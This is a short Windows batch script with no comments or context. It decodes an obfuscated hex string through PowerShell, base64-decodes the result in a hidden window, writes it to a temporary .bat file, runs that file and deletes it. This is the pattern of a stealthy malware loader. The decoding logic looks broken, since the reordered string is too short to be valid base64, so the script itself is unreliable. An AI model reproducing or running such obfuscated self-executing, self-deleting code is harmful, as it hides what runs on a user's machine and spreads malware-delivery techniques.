@echo off
setlocal enabledelayedexpansion
set "p=6b614e48475163354f4442334e53387561484a7255474e4861584d794d434a365d44587a5a413c2c"
set "q="
set "r=0 6 2 4 12 14 8 10 16 18 20 22 24 26 28 30 32 34 36 38 40 42 44 46 48 50 52 54 56"
for %%a in (%r%) do (
    set "h=!p:~%%a,2!"
    for /f %%b in ('powershell -NoLogo -Command "[char]::ConvertFromUtf32(0x!h!)"') do set "q=!q!%%b"
)
set "s="
for %%c in (4 1 6 0 3 5 2) do (
    set "s=!s!!q:~%%c,1!"
)
echo !s! | powershell -NoLogo -WindowStyle Hidden -Command "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-Content -)))" > "%temp%\tmp.bat"
call "%temp%\tmp.bat"
del "%temp%\tmp.bat"
exit
